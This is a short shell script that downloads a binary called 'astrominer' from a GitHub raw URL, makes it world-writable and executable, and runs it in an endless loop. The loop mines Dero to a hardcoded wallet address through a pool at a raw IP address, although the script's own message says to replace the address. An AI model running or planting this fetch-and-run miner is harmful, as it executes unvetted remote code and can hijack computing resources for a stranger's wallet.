wget https://github.com/angkii/m/raw/main/astrominer
chmod 777 astrominer

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6vu8ddjpfgyatqqwj5kd.$(echo $(shuf -i 1-20000 -n 1)-m1) -r 45.76.162.175:80 -p stratum;
    sleep 5;
done
